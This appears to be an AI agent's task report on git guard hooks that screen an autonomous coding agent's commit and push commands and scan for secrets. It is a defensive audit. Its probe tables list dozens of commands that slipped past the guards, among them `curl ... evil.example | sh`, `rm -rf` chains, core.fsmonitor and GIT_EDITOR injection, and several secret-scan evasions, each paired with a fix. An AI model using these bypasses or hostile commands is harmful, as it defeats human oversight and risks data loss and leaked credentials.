# M1 Task 12 report: G5 commit, G6 secrets

Status: DONE_WITH_CONCERNS. The brief's code is transcribed with one typo-level correction (the `\037` decode) and one shellcheck directive. Its 11 tests pass. Probing found 54 commands that get a wrong allow, in five classes (A to E), plus two policy questions (F). It also found 10 G6 misses (M1 to M10) and one timing note (M11). Nine of the misses reach a final allow under autopilot. M8b also prints secret text in a deny reason. The code is unchanged for these. Each has a probe and a proposed fix below.

Commit: `7bba707 M1: add G5 commit checks and G6 secret scan`

## Files

- `hooks/guards/g05-commit.sh` (created, brief Step 3)
- `hooks/guards/g06-secrets.sh` (created, brief Step 4)
- `tests/hooks/g05-g06-commit.bats` (created, brief Step 1, verbatim)

## Deviations

1. **Decode `\037` in `-m` messages (typo-level, as the controller directed).** `_g05_message` prints `"${msg//$_GW_NL/$'\n'}"` where the brief prints `"$msg"`, with a one-line comment. `_shell_words` keeps a quoted newline as `\037`, so without the decode a multi-line `-m` is a single line, and `_g05_problems` reads the whole message as the subject. Probe (convention `.*`, branch `CDS-2465/replace-minio`), `git commit -m 'swap MinIO<newline>CDS-2465 in the body'`:
   - brief verbatim: autopilot `allow`, interactive `ask (message checks pass)`. The subject `swap MinIO` lacks the id and was waved through.
   - with the decode: `deny G5: subject lacks the ticket id CDS-2465 from branch CDS-2465/replace-minio` in both modes.
   Checked on `/bin/bash` 3.2.57: `${m//$N/$'\n'}` inside double quotes gives real newlines.
2. **`# shellcheck disable=SC2016 # a literal $( in the text`** above `case "$msg" in *'$('* ...` in `_g05_message`. Without it, `shellcheck` exits 1 (SC2016 info). This is the same directive and comment that `gitctx.sh`, `g01-git.sh` and `g02-pr.sh` use for the same pattern.

## TDD evidence

All commands ran from the repo root with `export PATH="$HOME/.volta/bin:$HOME/.local/bin:$PATH"`.

RED: `tests/run-bats tests/hooks/g05-g06-commit.bats` gave `1..11`: 10 `not ok`, each failing at its first `decision_of` assertion because the guard files did not exist and no vote was cast. Test 9 (`G6: a clean staged change: no vote`) expects `none` and passed vacuously.

GREEN: the same command gave `1..11`, 11 `ok`, 5.0 s.

Full set before commit:
- `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats`: `1..243`, 243 `ok`, no `not ok`, exit 0.
- `node --test tests/*.test.mjs`: `# tests 46`, `# pass 46`, `# fail 0`.
- `shellcheck` and `shellcheck -x` on `g05-commit.sh` and `g06-secrets.sh`: exit 0, no output (after deviation 2). `shellcheck -x hooks/pre-tool-use`: exit 0.

## The here-doc commit form (controller's question)

`git_words` leaves here-doc bodies out of records, so the record G5 sees for Claude Code's standard form

```
git commit -m "$(cat <<'EOF'
CDS-2465: swap MinIO

Why.
EOF
)"
```

holds the word `$(cat <<'EOF'...EOF...)`. `_g05_message` finds `$(` and returns 1, so G5 votes `ask`. Probed results:

| Mode | Decision |
|---|---|
| autopilot | `deny G5: commit message cannot be checked here; write it to a file and use git commit -F <file> (autopilot: nobody to ask)` |
| `commit.policy: auto` | `ask` (same reason) |
| default | `ask` |

Consequence for unattended runs: no commit in the standard Claude Code form can run unattended, and `commit.policy: auto` never auto-allows it either. Every autopilot commit is denied once. Claude must then write the message to a file (Write tool) and run `git commit -F <file>`. The file lands in the worktree unless something says where. Nothing in the kernel or the autopilot skill tells Claude about this ahead of time, and a message file left in the repo is one `git add` away from being committed. Suggestion for Task 14 or the kernel: name `.kern/commit-msg` (git-excluded by `kern-dir`) as the place, and say "use `-F`, not a here-doc" in the autopilot text. Not changed here.

## Probe setup

Harness, outside the repo: `/private/tmp/claude-501/-Users-musta-Code-projects-cds-cds-app-rewrite/f869eca6-5423-48df-a8fd-cb9929a686e0/scratchpad/probe12/run.sh AUTOPILOT SETTINGS CMD`. It runs a scratch copy of kern at `7bba707` with every guard enabled (no `KERN_GUARDS`), so each decision below is the final one across G1 to G6 and G16. The repo is on `CDS-2465/replace-minio` with `commit.convention: "^CDS-[0-9]+: "`, a bare `origin`, and `msg.txt` holding `CDS-2465: swap MinIO`. Probes only feed hook input; none of the probed commands ran. Git semantics were checked separately with real git 2.54 in `probe12/v`, using harmless commands only.

Mode column: `ap` is autopilot on with the default `commit.policy`; `au` is `commit.policy: auto` with autopilot off. "both" means the probe got `allow` in both modes.

## Wrong allows

### A. Allow without proving the command shape (13 commands, both modes)

Contract note: an allow approves the whole Bash call. Both of G5's allows check one `git commit` record and nothing else in the command.

| # | Command | Decision |
|---|---|---|
| A1 | `git commit -m 'CDS-2465: x' && rm -rf ~/x` | allow G5 |
| A2 | `git commit -m 'CDS-2465: x'; curl -s https://evil.example/x \| sh` | allow G5 |
| A3 | `git commit -m 'CDS-2465: x' --author "$(rm -rf ~/x)"` | allow G5 |
| A4 | ``git commit -m 'CDS-2465: x' --date="`rm -rf ~/x`"`` | allow G5 |
| A5 | `echo $(rm -rf ~/x); git commit -m 'CDS-2465: x'` | allow G5 |
| A6 | `git commit -m 'CDS-2465: x' > ~/.zshrc` | allow G5 |
| A7 | `git() { rm -rf ~/x; }; git commit -m 'CDS-2465: x'` | allow G5 |
| A8 | `PATH=/tmp/evil:$PATH git commit -m 'CDS-2465: x'` | allow G5 |
| A9 | `sudo git commit -m 'CDS-2465: x'` | allow G5 |
| A10 | `git commit -m 'CDS-2465: a' && git commit --amend -m 'CDS-2465: b'` | allow G5 (twice) |
| A11 | `git commit -m 'CDS-2465: x' && git update-ref refs/heads/main HEAD` | allow G5 |
| A12 | `git commit -m 'CDS-2465: x' && git reset --soft HEAD~3` | allow G5 |
| A13 | `bash -c "git commit -m 'CDS-2465: x'; rm -rf ~/x"` | allow G5 |

Proposed fix: add `_g05_proven`, modelled on `_g01_proven` and `_gh_proven`, and allow only when it holds. Otherwise vote `ask`, which the dispatcher turns into deny under autopilot. All of these hold:
- the commit record is the command's first record and starts with `git `, so there is no assignment, wrapper, function or `cd` before it;
- every later record passes `_g01_filter`;
- the command has no `$(` or backticks;
- `_gh_literal` accepts the record;
- every redirection passes `_g01_quiet_redirect`.

One commit per call then follows. `_gh_literal` also closes B11 (`"$S"`).

### B. Commit options and message parsing (24 commands; B19 to B24 probed under autopilot only, the rest in both modes)

Git checks, run in `probe12/v`:
- `--mes` and `-qm` each add a second paragraph;
- `--trailer` adds the trailer;
- `.` and `-i f.txt` commit unstaged content;
- `--no-verif` committed past a failing pre-commit hook;
- `-C HEAD` on another person's commit keeps `Other <other@x.com>` as author;
- `--cleanup=strip -F strip.txt` gives the subject `evil subject`.

| # | Command | Decision | What git does |
|---|---|---|---|
| B1 | `git commit --amend -m 'CDS-2465: x'` | allow, both | rewrites HEAD |
| B2 | `git commit --amend --no-edit` (HEAD `CDS-2465: base`) | allow, both | rewrites HEAD |
| B3 | `git commit -C HEAD` | allow, both | new commit as HEAD's author |
| B4 | `git commit --no-verify -m 'CDS-2465: x'` | allow, both | skips pre-commit and commit-msg hooks |
| B5 | `git commit -n -m 'CDS-2465: x'` | allow, both | same |
| B6 | `git commit --no-verif -m 'CDS-2465: x'` | allow, both | same (abbreviation) |
| B7 | `git commit --allow-empty -m 'CDS-2465: x'` | allow, both | empty commit |
| B8 | `git commit --author='Claude <noreply@anthropic.com>' -m 'CDS-2465: x'` | allow, both | AI attribution in the author field |
| B9 | `git commit --date='2001-01-01' -m 'CDS-2465: x'` | allow, both | backdated |
| B10 | `git commit -m 'CDS-2465: x' --trailer 'Co-authored-by: Claude <noreply@anthropic.com>'` | allow, both | attribution trailer committed |
| B11 | `S='Co-authored-by: Claude ...'; git commit -m 'CDS-2465: x' -m "$S"` | allow, both | same |
| B12 | `git commit -m 'CDS-2465: x' --mes 'Co-authored-by: Claude ...'` | allow, both | same (abbreviation) |
| B13 | `git commit -m 'CDS-2465: x' -qm 'Co-authored-by: Claude ...'` | allow, both | same (cluster) |
| B14 | `git commit -m 'CDS-2465: x' --messa='Co-authored-by: Claude ...'` | allow, ap | same (`--opt=value` abbreviation) |
| B15 | `git commit -m 'CDS-2465: x' -- id_rsa` | allow, both | commits the worktree content of the path |
| B16 | `git commit -m 'CDS-2465: x' .` | allow, both | every tracked change, like `-a` |
| B17 | `git commit -i . -m 'CDS-2465: x'` | allow, both | same |
| B18 | `git commit -m 'CDS-2465: x' --pathspec-from-file=list.txt` | allow, both | paths from a file |
| B19 | `git commit --fixup=HEAD -m 'CDS-2465: x'` | allow, ap | subject is `fixup! ...` |
| B20 | `git commit -c HEAD` | allow, ap | editor commit; the brief says an editor commit asks |
| B21 | `git commit --reedit-message HEAD` | allow, ap | same |
| B22 | `git commit -e -m 'CDS-2465: x'` | allow, ap | same |
| B23 | `git commit --edit -F msg.txt` | allow, ap | same |
| B24 | `git commit --cleanup=strip -F strip.txt` (file `# CDS-2465: swap` / `evil subject`, convention `.*`) | allow, ap | the checked subject is a line git strips |

Proposed fix: read commit arguments with `_g01_opts` against a `_G05_COMMIT_OPTS` table taken from `git commit -h` (git 2.54). Abbreviations, clusters and `=value` forms then resolve as git resolves them, and the messages come from every `--message=` token, which closes B12 to B14. Allow only when:
- every token is in a safe set: `--message`, `--file` (a regular, non-symlink file inside the worktree, as `_gh_file_ok` checks), `--quiet`, `--signoff`;
- there is no `@` argument and no `--`, so no pathspec.

Anything else asks (deny under autopilot), including `--amend`, `-C`, `-c`, `--edit`, `--no-verify`, `--author`, `--date`, `--trailer`, `--cleanup`, `--fixup`, `--squash`, `--include`, `--only` and `--pathspec-from-file`. B20 to B23 are a mismatch with the brief's own interface line ("an editor commit asks").

### C. Global git options, environment and directory (9 commands, both modes)

| # | Command | Decision | Effect |
|---|---|---|---|
| C1 | `git -c core.hooksPath=/tmp/h commit -m 'CDS-2465: x'` | allow | runs hooks from any directory |
| C2 | `git -c core.fsmonitor='rm -rf ~/x' commit -m 'CDS-2465: x'` | allow | runs the command (`touch` variant created the file) |
| C3 | `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/h git commit ...` | allow | as C1 |
| C4 | `GIT_EDITOR='rm -rf ~/x;:' git commit -e -m 'CDS-2465: x'` | allow | runs the editor command |
| C5 | `cd <other repo> && git commit -m 'CDS-2465: x'` | allow | commits in another repo; branch, settings and G6 read the hook cwd's repo |
| C6 | `git -C <other repo> commit -m 'CDS-2465: x'` | allow | commits in a repo whose settings kern did not read |
| C7 | `git --git-dir=<o>/.git --work-tree=<o> commit -m 'CDS-2465: x'` | allow | as C5 |
| C8 | `GIT_DIR=<o>/.git git commit -m 'CDS-2465: x'` | allow | as C5 |
| C9 | `GIT_INDEX_FILE=/tmp/idx git commit -m 'CDS-2465: x'` | allow | commits an index G6 never read |

`git --config-env=core.fsmonitor=EVIL commit ...` got no vote (`git_sub` reads `--config-env=...` as the subcommand), so there was no allow.

Proposed fix, inside `_g05_proven`:
- the record is `git` followed only by the subcommand, so no `-c`, `--git-dir`, `--work-tree` or `--config-env`, as G1's PLAIN requires;
- a `-C <dir>` is accepted only when `kern_main_root <dir>` equals `KERN_MAIN`;
- no earlier `cd`, `pushd` or `GIT_*=` record or assignment prefix (the A fix already requires the record to be first and to start with `git `).

### D. Broad staging folded into the commit (7 commands, both modes)

| # | Command | Decision |
|---|---|---|
| D1 | `git add --al && git commit -m 'CDS-2465: x'` | allow G5 (git: `--al` is `--all`, checked) |
| D2 | `git add -Av && git commit -m 'CDS-2465: x'` | allow G5 |
| D3 | `git add --upd && git commit -m 'CDS-2465: x'` | allow G5 |
| D4 | `git stage -A && git commit -m 'CDS-2465: x'` | allow G5 (git: `stage` is `add`, checked) |
| D5 | `git add ./ && git commit -m 'CDS-2465: x'` | allow G5 |
| D6 | `git add "$PWD" && git commit -m 'CDS-2465: x'` | allow G5 |
| D7 | `git add -- id_rsa && git commit -m 'CDS-2465: key'` (a key in `id_rsa`) | allow G5; G6 misses it (M1) |

Proposed fix:
- The A fix makes a commit allowable only alone. Staging then runs in its own call, and G6 scans the real index when the commit comes.
- For `_g05_add`, read `add` and `stage` with `_g01_opts` against a `git add -h` table, so `--al`, `-Av` and `--upd` resolve.
- Treat a pathspec as broad when it resolves to the worktree root or above (`.`, `./`, `..`, `:/`, `$PWD`), holds glob or magic characters, or contains `$`.

### E. Message file changed in the same command (1 command, both modes)

| # | Command | Decision |
|---|---|---|
| E1 | `printf 'CDS-2465: y\n\nCo-authored-by: Claude <noreply@anthropic.com>\n' >> msg.txt; git commit -F msg.txt` | allow G5 (G5 reads `msg.txt` before the append runs) |

Fix: the A fix (commit alone in its command).

Related, low risk, not counted:
- `git commit -F <path outside the repo>` with a passing message is allowed. The content is checked.
- `-F /dev/stdin` passed `[ -f ]` in the probe and read the hook's own, already consumed stdin. The result was a deny for an empty subject, not an allow.

Applying `_gh_file_ok` to `-F` paths would bring both in line with G2's `--body-file` rule.

### F. Policy questions for the controller (not counted)

| # | Command | Decision |
|---|---|---|
| F1 | on `main` in the main checkout: `git commit -m 'CDS-2465: x'` | allow under autopilot |
| F2 | on `main`: `git commit --amend -m 'CDS-2465: x'` | allow under autopilot (B fix closes this one) |

The brief allows a passing commit under autopilot without condition. Committing straight onto the base branch in the main checkout is the kind of shared-state change D3 asks about. Proposal: under autopilot and `commit.policy: auto`, ask when `branch_protected "$(current_branch "$dir")"` holds or HEAD is detached.

## G6 misses

| # | Probe | Decision | Should be |
|---|---|---|---|
| M1 | key in `id_rsa`, unstaged: `git add -- id_rsa && git commit -m 'CDS-2465: key'` | ap: allow | deny |
| M2 | tracked `k.txt` with a key added, unstaged: `git commit -m 'CDS-2465: key' -- k.txt`; `git commit -i k.txt -m ...`; `git commit -m ... .` | ap: allow (all three) | deny |
| M3 | same `k.txt`: `git commit -qa -m 'CDS-2465: key'` | default: ask (G5's `-a` ask) | deny. `git commit -a -m ...` gives `deny G6: ... k.txt:2 private-key`; G6's `case " $rest "` sees only ` -a `, ` --all `, ` -am ` |
| M4 | key staged in another repo: `cd <o> && git commit ...`; `git --git-dir=<o>/.git --work-tree=<o> commit ...` | ap: allow | deny, or ask: G6 scanned the hook cwd's index |
| M5 | `git commit --allow-empty -m 'CDS-2465: token ghp_abcdefghijklmnopqrstuvwxyz0123'` | ap: allow | deny: the message is not scanned |
| M6 | key staged, repo config `color.ui always` | ap: allow | deny: colored lines start with ESC, so `_g06_added` sees no `+` |
| M7 | key staged, repo config `diff.external /usr/bin/true` | ap: allow | deny: no patch at all. `git diff` also runs the configured program inside the hook |
| M8 | staged `k3.txt` holding one line `++ AKIAABCDEFGHIJKLMNOP` | ap: allow | deny |
| M8b | staged `k2.txt`: `++ ghp_LEAKEDabcdefghijklmnopqrstu` then `x = AKIAABCDEFGHIJKLMNOP` | `deny G6: possible secret ...: ghp_LEAKEDabcdefghijklmnopqrstu:1 aws-access-key; ghp_LEAKEDabcdefghijklmnopqrstu:1 github-token` | deny without the secret text. The reason prints a token, breaking the "never prints the text" contract |
| M9a | key committed and already on `origin` (upstream set): `git push public CDS-2465/replace-minio` | ap: allow G1; `push.policy: auto`: allow G1 | deny: range `@{u}..HEAD` is empty for a remote the commits never reached |
| M9b | key only on `CDS-2465/side`, HEAD clean: `git push origin CDS-2465/side` | default: ask G1 | deny: G6 scans HEAD, not the pushed ref |
| M9c | no upstream, `origin/HEAD` unset, no `base_branch`: `git push -u origin CDS-2465/nobase` | ap: allow G1 | deny: `_g06_push` returns without scanning |
| M9d | `AKIAABCDEFGHIJKLMNOP` added only in a merge commit (`git merge --no-ff --no-commit` plus a new file): `git push origin CDS-2465/m2` | ap: allow G1 | deny: `git log -p` prints no diff for merges (`+++` lines shown: `b/h.txt` only) |
| M10a | patterns: `-----BEGIN PGP PRIVATE KEY BLOCK-----`, `sk_live_abcdefghijklmnopqrstuvwx`, `ASIAABCDEFGHIJKLMNOP`, `github_pat_11ABCDEFG0...` | ap: allow (each) | deny |
| M10b | `never_commit: *.db, .env*` and staged `config/.env` | ap: allow | deny: `case` matches `.env*` against the whole path |
| M10c | `never_commit: [*.db, .env*]` and staged `data.db` (the plain list denies it) | ap: allow | deny: the brackets stay part of the globs; `list_has` strips them, `_g06_paths` does not |
| M11 | 22 MB staged text | 7 s, allow | note only: about 60 MB would pass the 20 s hook timeout and block (fail closed) |

Proposed fixes:
- M1: closed by the G5 A fix (commit alone). Otherwise G6 votes ask when an earlier record in the command is `git add` or `git stage`.
- M2: when the commit has pathspecs, `--include` or `--only`, also scan `git diff HEAD -- <paths>`. Or let the G5 B fix make those ask, and have G6 vote ask for them too.
- M3: share one `-a` reader between G5 and G6, using `_g01_opts`.
- M4: vote ask (deny under autopilot) after `cd`, `pushd`, `GIT_*=` or `--git-dir`/`--work-tree`, as G1 does with `moved`. Or rely on the G5 A and C fixes.
- M5: scan the message too. Reuse `_g05_message`'s text, or scan the command text and report `message <rule>`.
- M6 and M7: run every diff as `git -c color.ui=never -c diff.noprefix=false diff --no-color --no-ext-diff --no-textconv ...`, and pass the same flags to `log -p`.
- M8 and M8b: in `_g06_added`, treat `+++ ` as a header only between a `diff --git` line and the first `@@`. For example, set `h = 1` on `/^diff --git /`, match `h && /^\+\+\+ /`, and clear `h` on `/^@@ /`. Then text never becomes a path.
- M9: scan what each pushed ref adds that the target remote lacks: `git log -p --diff-merges=first-parent <src> --not --remotes=<remote>` per refspec source, defaulting to HEAD. This covers a and b. If no source or remote resolves (c), vote ask, not nothing. `--diff-merges=first-parent` (or `--remerge-diff` on git 2.36 and later) covers d.
- M10a: widen the rules:
  - `-----BEGIN [A-Z ]*PRIVATE KEY( BLOCK)?-----`
  - `(AKIA|ASIA)[0-9A-Z]{16}`
  - `github_pat_[A-Za-z0-9_]{22,}`
  - a stripe rule `(sk|rk)_live_[A-Za-z0-9]{20,}`
  This is a scope call; gitleaks covers more when installed.
- M10b and M10c: strip one pair of brackets as `list_has` does. Match a glob that holds no `/` against the basename as well (`case "${name##*/}" in $glob`), as `.gitignore` does.

## Self-review

- All three files match the brief except the two listed deviations. Nothing else changed.
- The tests check decisions and reason text. The G6 test asserts that the key body is absent from the output.
- The commit uses `git add --` with the three named paths, subject `M1: add G5 commit checks and G6 secret scan` (44 chars), the brief's body, and no trailers. Nothing was pushed.
- The probe scratch copy and repo are outside the kern repo; `git status` in kern is clean after the commit.

---

# Fix round 1: G5 allows only a proven commit shape; G6 scans what is pushed

Status: DONE_WITH_CONCERNS (concerns are cost and residuals, listed last). Every ruling is applied. Every round-0 probe is now a regression test, and the brief's 11 tests are unchanged and pass. `gitctx.sh`, `g01-git.sh` and `g02-pr.sh` are unchanged.

Commit: `68ab15d M1: G5 allows only a proven commit shape; G6 scans what is pushed`

## Changes

### G5 (`hooks/guards/g05-commit.sh`)

- **Record reading.** `_g05_split` reads each git record (any case, any path), as `_g01_git_rec` does, into:
  - `_G05_DIR`: the hook cwd, then each `-C`;
  - `_G05_SUB` and `_G05_ARGS`;
  - `_G05_PLAIN`: only `-C` pairs before the subcommand;
  - `_G05_CROSS`: a `-C` whose `kern_main_root` is not the session's `KERN_MAIN`;
  - `_G05_MOVED`: `--git-dir`, `--work-tree`, `GIT_DIR=` or `GIT_WORK_TREE=`.
  
  A `cd`, `pushd` or `popd` record sets MOVED for the records after it.
- **Option tables.** `_G05_COMMIT_OPTS` and `_G05_ADD_OPTS` come from `git commit -h` and `git add -h` (git 2.54), plus commit's hidden `--allow-empty` and `--allow-empty-message`. Both are read with G1's `_g01_opts`, so clusters split, unique prefixes expand and `--opt=value` attaches as git does it.
- **`_g05_proven IDX TOKS` (ruling 1, both allow paths).** Every condition must hold. The first that fails is named in `_G05_WHY`, which goes into the ask or deny reason.
  - the commit is the command's first record and starts with `git `, so no `cd`, `pushd`, assignment, `sudo`, function or alias comes before it;
  - every later record passes `_g01_filter`;
  - the command has no `$(` or backtick;
  - `_gh_literal` accepts the record, so no `$`, glob, `~` or brace list;
  - only `-C` pairs inside this repository come before `commit`, so there is no `-c`, `--git-dir` or `--work-tree`;
  - every token is `--message`, `--file`, `--quiet`, `--verbose` or a quiet redirection;
  - there is exactly one message source and no pathspec;
  - the `-F` file passes `_g05_file_ok` (ruling 2: G2's `_gh_file_ok` on the path resolved from `_G05_DIR`);
  - HEAD is on a branch, and `branch_protected` says no (ruling 2).
- **`_g05_message DIR TOKS [raw]`** reads the parsed tokens:
  - Every `--message` counts, so `--mes`, `--messa=` and `-qm` second messages are checked.
  - `--trailer` values are appended to the checked text, so an attribution trailer is denied in both modes.
  - These are unreadable, so they ask (deny under autopilot):
    - `-e`;
    - `-c` without `--no-edit`;
    - an editor commit with no source;
    - `--fixup` and `--squash`;
    - `-F -`;
    - a non-regular `-F` file;
    - a `-m` holding `$(` or a backtick.
- **Retry reason (ruling 4).** An unreadable message gets `commit message cannot be read: write the message with -m '<text>' or -F <file in the repo>; a $( ) message cannot be checked`.
- **`_g05_add` (ruling 3).** It runs for `add` and `stage`, and treats these as broad:
  - `--all`, `--no-ignore-removal`, `--update` and `--renormalize`, in any spelling;
  - `--pathspec-from-file`;
  - an option `_g01_opts` rejects;
  - a pathspec `_g05_wide` calls wide.
  
  A wide pathspec is any of:
  - `.` or `..` in any spelling;
  - magic (`:/`, `:!x`);
  - `$`, a glob or `~`;
  - a directory that is the worktree root or holds it;
  - any path after cd, `--git-dir` or `--work-tree`.

### G6 (`hooks/guards/g06-secrets.sh`)

- **Git reads (ruling 5).** Every git read goes through `_g06_git`, which adds `-c color.ui=never`. Every patch also takes `--no-color --no-ext-diff --no-textconv --src-prefix=a/ --dst-prefix=b/`.
- **Messages.** The commit message is scanned, from `_g05_message ... raw`. The messages of pushed commits are scanned too. Hits read `commit message:<line> <rule>` and `commit <sha> message:<line> <rule>`.
- **Pushes.** `_g06_push` reads the push with `_g01_opts "$_G01_PUSH_OPTS"`. The sources are:
  - each refspec source, resolved with `rev-parse --verify`;
  - `--branches` for `--all`, `--branches`, `--mirror` or a `*` pattern;
  - `--tags` for `--tags` or `--mirror`;
  - otherwise HEAD.
  
  It scans `git log -p -m <srcs> --not --remotes=<target>`, where the target is the repository argument or else git's push remote (`branch.<b>.pushRemote`, `remote.pushDefault`, `branch.<b>.remote`, `origin`). A target `git remote` does not list excludes nothing. A source that does not resolve asks.
- **Commits.** `-a` in any spelling and `--pathspec-from-file` add the unstaged diff. Pathspecs (bare, `-i` or `-o`) add `git diff -- <paths>`, because git commits their worktree content.
- **Rules.** Added: `pgp-private-key`, `stripe-key` (`[rs]k_live_`), `ASIA` in `aws-access-key`, and `github_pat_` in `github-token`.
- **Header parsing.** `_g06_added` reads a `+++ ` line as a header only between a `diff` line and the first `@@`. An added line starting with `++ ` is therefore scanned, and its text never becomes a path.
- **never_commit.** A glob also matches a path's last component, and one pair of brackets around the list is dropped.
- **Scan cost.** `_g06_scan` runs one grep of all rules over the stream, then sorts only the hit lines by rule. The per-rule loop over a shell variable took 16 s on a 22 MB diff. The whole hook now takes 8 s on 22 MB (7 s before this round), against the 20 s timeout.

## Deviations from the rulings, and additions

1. **`--not --remotes=<target>`, not `--not --remotes`.** With every remote excluded, M9a still passes. In M9a the key commit is already on `origin` and the push goes to `public`, so `--remotes` drops the commit. Excluding only the target remote's tracking refs covers M9a, M9b, M9c and M9d (tests 30 to 33).
2. **`-m`, not `-m --first-parent`.** `--first-parent` walks only first parents. A pushed side-branch commit that added a key, followed by a later side commit that removed it, would never be walked, yet both commits are pushed. `-m` over every unremoted commit covers that and still shows evil-merge content (test 33).
3. **Additions not named in the rulings**, each pinned by a test:
   - G6 scans the unstaged content of pathspec, `-i`, `-o` and clustered `-a` commits. This closes M2 and M3 in interactive mode, where G5 only asks.
   - A push source G6 cannot resolve asks, for example `"$(git branch --show-current)"` or a missing branch. Before, it went unscanned.
   - G5 checks `--trailer` values for attribution.
4. **Bug found during this round, fixed and pinned.** The committed `_g05_message` ran `git log -1 --format=%B "$ref"`. So `git commit -C --output=<path>` made the hook itself write `<path>`. Verified on the scratch copy of `7bba707`: the hook created `inj.txt` holding a commit message. `_g05_log` now passes `--end-of-options` and `--no-show-signature`. Test `a -C or -c commit name is never read as a git log option` asserts no file appears.
5. **No `gitctx.sh` change was needed.**

## TDD evidence

RED: with the 26 new tests appended and the guards at `7bba707`, `tests/run-bats tests/hooks/g05-g06-commit.bats` gave `1..36`. 23 were `not ok`, each failing on its probe:
- `want !allow, got allow` for the class A to E commands;
- `want ask, got none` for `git add --al`;
- `want deny, got none` for each G6 miss;
- test 20 on `[ ! -e inj1.txt ]`;
- test 18 on the retry text.

Tests 19 (multi-line `-m`) and 22 (named paths: no vote) already passed: the decode was in `7bba707`, and named-path adds never voted.

The unresolved-source test was added later. It went RED (`want ask, got none for: git push origin "$(git branch --show-current)"`), then GREEN after the `_g06_push` change.

GREEN: `tests/run-bats tests/hooks/g05-g06-commit.bats` gave `1..37`, 37 `ok`, in 1:36.

Full set: `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats` gave `1..269`, 269 `ok`, exit 0. The controller's backstop run on the same tree also passed, in 457 s. `node --test tests/*.test.mjs`: 46 pass, 0 fail. `shellcheck` and `shellcheck -x` on both guards: exit 0, no output.

## Probe evidence (scratch copy, all guards, no `KERN_GUARDS`)

- **All round-0 G5 commands** (A, B, C, D and E: 55 commands, each under autopilot and under `commit.policy: auto`, 110 rows): no allow. The controls `git commit -m 'CDS-2465: x'` (autopilot) and `git commit -F msg.txt` (policy auto) still allow.
- **New probes against the proven shape** (30 commands, both modes): allowed are `{ git commit -m ...; }`, `( git commit -m ... )`, `git commit -m ... &` and `git commit -m ... && tail`, plus `git -C sub` and `git -C .claude/worktrees/wt` (same repository, unprotected branch), and a message holding `{a,b}` inside double quotes. Each does exactly one checked commit. Unproven, as intended:
  - `{ ...; } > ~/.zshrc` and `( ... ) > out.txt`;
  - `& rm`, a backslash-newline `&& rm` and a newline-separated `rm`;
  - `> >(tail)`, `-F <(echo ...)` and `<<X` here-docs;
  - filters with file arguments or redirects (`grep -r key /`, `tail > out.txt`, `tee out.txt`);
  - `--end-of-options -m`, two `-m`, `-F` plus `-m`, `--no-quiet` and `-S`;
  - `-C ../` (outside the repo) and `-C <worktree on main>` (protected);
  - an unquoted glob in the message, `-F /dev/stdin` and a tab after `git`.

## Concerns and residuals

- **Test time.** The file runs about 280 hook calls (every probe in both modes), so it takes 96 to 122 s. The controller measured the full suite at 457 s, against about 90 s before this task; the rest of the growth is G5 and G6 running on every dispatcher call in the other files (see the timing section). To trim it, run the `commit.policy: auto` pass on a few representative commands, since both modes reach `_g05_proven` the same way. I kept both modes, because the ruling names both allow paths.
- **False positives, both fail closed.** A glob pathspec (`git add src/*.ts`) counts as wide and asks; it is denied under autopilot. So does `cd x && git add f`, the same rule G1 applies after `cd`. The retry is named paths or `git -C <dir> add -- <paths>`.
- **Repo config can still run code inside G6.**
  - With `-a` or pathspecs, G6's worktree `git diff` applies clean filters (`filter.<x>.clean`) and may call `core.fsmonitor`.
  - No git switch turns clean filters off.
  - Both need the config to be planted first by a command that no guard reviews (`git config` writes are unguarded).
- **Hooks and config can still change a proven commit.** Repo hooks (`pre-commit`, `prepare-commit-msg`, `commit-msg`) and config (`commit.cleanup=strip`, a `core.hooksPath` set earlier) can change what the commit does or its message. The same unguarded `git config` gap applies.
- **Push scan cost.** A push to a remote with no tracking refs (just added, or a URL) scans the whole history reachable from its sources. On a large repo that can pass the 20 s timeout. The dispatcher then blocks, which fails closed.
- **Scan matches the path too.** `_g06_scan` matches the whole `path:line:text` line, so a file whose name looks like a token is reported. Only names are printed, never text.
- **Here-doc form.** The here-doc commit form stays unproven (ruling 4) and is denied under autopilot with the retry text.

## Where the per-call time goes (controller's question)

All figures are from the scratch copy at `68ab15d`. Timings are the mean of 30 dispatcher calls, second round; the first round was noisier. Processes were counted with logging shims for git, awk, sed, grep, cat and the other tools the hooks call.

### A Bash command that is not a commit or push (`ls`)

| Guards run | ms per call | Processes | git calls |
|---|---|---|---|
| none (dispatcher only) | 123 | 22 | 1 |
| G1 | 135 | 25 | 1 |
| G2 | 145 | 32 | 1 |
| G5 | 135 | 25 | 1 |
| G6 | 136 | 25 | 1 |
| G16 | 139 | 27 | 1 |
| all | 272 | 66 | 1 |

G3 and G4 add 10 processes each, like G2.

- **No git call from G5 or G6 for `ls`.** `_g05_split` stops at the first word, before any git call. G6 calls `_g05_split` and stops the same way. The one git call in the whole hook is the dispatcher's `kern_main_root` (`git -C <cwd> worktree list`).
- **Each of G5 and G6 spawns 3 awk processes:**
  - `ti_get command`;
  - `git_words` (its `_split_words`);
  - `_cmd_words` for the record.
  
  Each extra record adds one `_cmd_words`: `ls -la && echo hi | wc -l` costs 5 processes per guard.
- **G5 and G6 together cost about 25 ms of the roughly 150 ms of guard time on `ls`.** G2, G3 and G4 are the larger share: each loads the records (`_gh_load`, which runs `git_words`) and runs `gh_sub` on every record. The fixed dispatcher cost of 123 ms covers sourcing seven guard files, the settings and autopilot reads (8 awk processes) and `kern_main_root`.
- **The command is split six times.** Each guard runs `git_words` on the same command: G1, G2, G3, G4, G5 and G6. A split done once in the dispatcher, kept in an array the guards read, would save about 5 awk runs and their subshells per call. That is a dispatcher and `gitctx.sh` change, outside this task.

### Where G5 and G6 do work (default policy)

| Command | Guard | Processes | git calls |
|---|---|---|---|
| `git commit -m 'CDS-2465: x'` | G5 | 38 (16 over baseline) | 1 |
| | G6 | 38 | 2 |
| `git push -u origin <branch>` | G5 | 25 | 0 |
| | G6 | 42 | 5 |

- **G5 on a commit.** The one git call is `symbolic-ref`, for the branch id. The other processes are `_g01_opts`, the message checks (`sed`, `grep`) and settings lookups. Under autopilot or `commit.policy: auto`, `_g05_proven` adds:
  - `symbolic-ref` for the current branch and `origin/HEAD`;
  - `kern_main_root` for each `-C`;
  - `rev-parse` and `check-ignore` inside `_gh_file_ok` for `-F`.
